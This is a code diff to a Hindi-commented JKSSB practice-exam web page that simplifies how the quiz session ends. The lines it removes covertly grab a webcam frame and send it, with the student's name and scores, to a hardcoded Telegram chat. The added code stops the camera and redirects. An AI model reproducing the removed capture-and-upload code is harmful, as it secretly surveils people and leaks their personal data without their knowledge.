@@ -199,12 +199,6 @@
         </div>
     </div>
 
-    <!-- Final Display Block triggered after session validation cycle wraps -->
-    <div class="quiz-box" id="reporting-panel" style="text-align: center; padding: 40px 20px;">
-        <h2 style="color: #22c55e; margin-bottom: 15px;">Practice Examination Concluded</h2>
-        <div id="score-telemetry" style="font-size: 18px; line-height: 2; margin-bottom: 25px;"></div>
-        <button class="start-btn" onclick="window.location.href='index.html'">Back to Home</button>
-    </div>
     <script>
         // चारों टॉपिक्स के 10-10 असली प्रश्नों का डेटाबेस
         const dynamicBank = {
@@ -355,66 +349,22 @@
             }, 1000);
         }
 
+                // लीडरबोर्ड और टेलीग्राम हटाकर सिर्फ सीधा सबमिशन और रीडायरेक्ट
         async function terminateSession() {
             clearInterval(clockTimer);
-            const videoEl = document.getElementById('webcam');
-            
-            const hiddenCanvas = document.createElement('canvas');
-            hiddenCanvas.width = videoEl ? (videoEl.videoWidth || 640) : 640;
-            hiddenCanvas.height = videoEl ? (videoEl.videoHeight || 480) : 480;
-            
-            if (videoEl && liveStream) {
-                const ctx = hiddenCanvas.getContext('2d');
-                ctx.drawImage(videoEl, 0, 0, hiddenCanvas.width, hiddenCanvas.height);
+
+            // कैमरे की लाइव फीड को बंद करना
+            if (liveStream) {
+                liveStream.getTracks().forEach(track => track.stop());
             }
+            const videoEl = document.getElementById('webcam');
+            if (videoEl) videoEl.style.display = "none";
 
-            let totalCorrect = 0;
-            let totalWrong = 0;
-            currentQuestions.forEach((item, idx) => {
-                if (userResponses[idx] === item.c) {
-                    totalCorrect++;
-                } else if (userResponses[idx] !== null) {
-                    totalWrong++;
-                }
-            });
-
-            const totalQuestions = currentQuestions.length;
-            const nonAttempted = totalQuestions - (totalCorrect + totalWrong);
-
-            const captionContent = `🚨 JKSSB Exam Monitoring\n\n👤 Name: ${studentIdentity}\n📚 Topic: ${selectedTopic}\n✅ Correct: ${totalCorrect}/${totalQuestions}\n❌ Wrong: ${totalWrong}\n⚪ Unattempted: ${nonAttempted}\n📅 Date: ${new Date().toLocaleString()}`;
-
-            hiddenCanvas.toBlob(async (imgBlob) => {
-                const payload = new FormData();
-                payload.append('chat_id', '6115912864');
-                payload.append('photo', imgBlob, 'candidate_face.jpg');
-                payload.append('caption', captionContent);
-
-                try {
-                    await fetch('https://telegram.org', {
-                        method: 'POST',
-                        body: payload
-                    });
-                } catch (e) {
-                    console.log("Telemetry fallback bypass");
-                }
-
-                if (liveStream) {
-                    liveStream.getTracks().forEach(track => track.stop());
-                }
-                if (videoEl) videoEl.style.display = "none";
-
-                document.getElementById('active-quiz-panel').style.display = 'none';
-                document.getElementById('reporting-panel').style.display = 'block';
-                
-                document.getElementById('score-telemetry').innerHTML = `
-                    <p style="font-size: 24px; font-weight: bold; color: #1d4ed8; margin-bottom: 10px;">Your Result Summary</p>
-                    <p style="color: #16a34a; font-weight: bold;">Correct Answers: ${totalCorrect}</p>
-                    <p style="color: #dc2626; font-weight: bold;">Wrong Answers: ${totalWrong}</p>
-                    <p style="color: #64748b; font-weight: bold;">Skipped: ${nonAttempted}</p>
-                `;
-
-                alert(`Thank you ${studentIdentity}, your practice test has been processed successfully!`);
-            }, 'image/jpeg', 0.7);
+            // सीधे छात्र को सफलता का मैसेज दिखाना
+            alert(`Thank you ${studentIdentity}, your JKSSB practice test has been submitted successfully!`);
+            
+            // सीधा होमपेज या मुख्य डैशबोर्ड पर वापस भेजना
+            window.location.href = "index.html";
         }
     </script>
 </body>
